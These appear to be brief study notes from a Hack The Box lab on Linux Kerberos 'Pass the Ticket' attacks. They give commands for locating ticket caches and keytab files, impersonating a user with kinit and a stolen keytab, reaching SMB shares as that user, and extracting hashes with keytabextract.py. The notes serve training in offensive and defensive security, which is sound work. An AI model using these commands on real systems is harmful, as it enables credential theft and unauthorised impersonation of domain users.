Linux Pass the Ticket

Date: 2024-11-27 12:52

Status:

Files

Tickets are almost always stored in the /tmp file system ls -ls /tmp The ticket is also stored in the environmental variable name KRB5CCNAME You authenticate to a domain controller with the keytab /etc/krb5.keytab is root readable only, if you have root you can use this A Linux script can use a keytab in automation on Windows.

Finding Keytab files

example 1: using find

find / -name *keytab* -ls 2>/dev/null

Example 2: using crontab

crontab -l

Commands

Example 1: To see if a Linux machine is using AD

realm list

Example 2: realm is not available

ps -ef | grep -i "winbind\|sssd"

Example 3: using env to find the krb5 cache

env | grep -i krb5

Example 4: Listing keytab file information

klist -k -t /opt/specialfiles/carlos.keytab

Impersonating a user

example 1: Using kinit and have the ability to read someone else’s keytab

klist
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
klist

Example 2: Using SMB to access information

smbclient //dc01/carlos -k -c ls

Keytab extraction

Example 1: using keytabextract.py

python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
